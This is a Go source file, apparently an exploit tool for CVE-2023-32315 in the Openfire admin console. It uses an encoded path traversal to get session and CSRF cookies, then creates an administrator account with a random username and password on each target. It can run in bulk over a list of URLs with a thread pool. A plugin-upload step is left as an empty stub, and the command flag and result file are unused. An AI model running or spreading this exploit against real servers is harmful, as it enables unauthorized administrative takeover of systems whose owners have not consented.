package main

import (
	"bufio"
	"flag"
	"fmt"
	"github.com/panjf2000/ants/v2"
	"github.com/projectdiscovery/rawhttp"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
)

func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func Between(str, starting, ending string) string {
	s := strings.Index(str, starting)
	if s < 0 {
		return ""
	}
	s += len(starting)
	e := strings.Index(str[s:], ending)
	if e < 0 {
		return ""
	}
	return str[s : s+e]
}

var finalresult []string

func verify(target interface{}, runCommand string) {
	//setup 1 获取csrf+jsessionid
	jsessionid := ""
	csrf := ""

	t := target.(string)
	res, err := rawhttp.Get(t + "/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp")
	if err != nil {
		fmt.Println(err)
		return
	}

	for _, cookie := range res.Cookies() {
		if cookie.Name == "JSESSIONID" {
			jsessionid = cookie.Value
		} else if cookie.Name == "csrf" {
			csrf = cookie.Value
		}
	}
	fmt.Printf("成功获取目标%s JSESSIONID: %s +csrf: %s", t, jsessionid, csrf)
	fmt.Println("")
	if jsessionid == "" || csrf == "" {
		fmt.Println("Failed to get JSESSIONID and csrf value")
		return
	}
	//setup 2 add user

	username := generateRandomString(6)
	password := generateRandomString(6)

	createUserUrl := fmt.Sprintf("%s/setup/setup-s/%%u002e%%u002e/%%u002e%%u002e/user-create.jsp?csrf=%s&username=%s&name=&email=&password=%s&passwordConfirm=%s&isadmin=on&create=%%E5%%88%%9B%%E5%%BB%%BA%%E7%%94%%A8%%E6%%88%%B7", t, csrf, username, password, password)
	res, err = rawhttp.Get(createUserUrl)

	m := map[string][]string{"Cookie": {"JSESSIONID=" + jsessionid, "csrf=" + csrf}}

	res, err = rawhttp.DoRaw("GET", createUserUrl, "", m, nil)
	if err != nil {
		fmt.Println(err)
		return
	}
	if res.StatusCode == http.StatusOK {
		fmt.Printf("用户增加成功：url:%s username:%s password:%s \n", t, username, password)
	} else {
		fmt.Println("用户添加失败。")
	}

	//setup 3 add plugin
	
}

func main() {
	var targetURL, runCommand, filepath string
	var thread int
	targets := []string{}

	flag.StringVar(&targetURL, "u", "", "")
	flag.StringVar(&filepath, "l", "", "")
	flag.StringVar(&runCommand, "c", "id", "")
	flag.IntVar(&thread, "t", 10, "")
	flag.CommandLine.Usage = func() {
		fmt.Println("执行命令：./CVE-2023-32315 -u http://127.0.0.1:9090")
		fmt.Println("批量检测：./CVE-2023-32315 -l url.txt -t 20")
	}

	flag.Parse()

	if len(targetURL) == 0 {
		file, err := os.OpenFile(filepath, os.O_RDWR, 0666)
		if err != nil {
			fmt.Println("Open file error!", err)
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			target := scanner.Text()
			if target == "" {
				continue
			}
			if !strings.Contains(target, "http") {
				target = "http://" + target
			}
			targets = append(targets, target)
		}
		wg := sync.WaitGroup{}
		p, _ := ants.NewPoolWithFunc(thread, func(i interface{}) {
			verify(i, "id")
			wg.Done()
		})
		defer p.Release()

		for _, t := range targets {
			wg.Add(1)
			_ = p.Invoke(t)
		}
		wg.Wait()
		fileName := "vuln.txt"
		file, err = os.Create(fileName)
		if err != nil {
			return
		}
		defer file.Close()
		for _, v := range finalresult {
			file.WriteString(v + "\n")
		}

	} else {
		verify(targetURL, runCommand)
	}

}
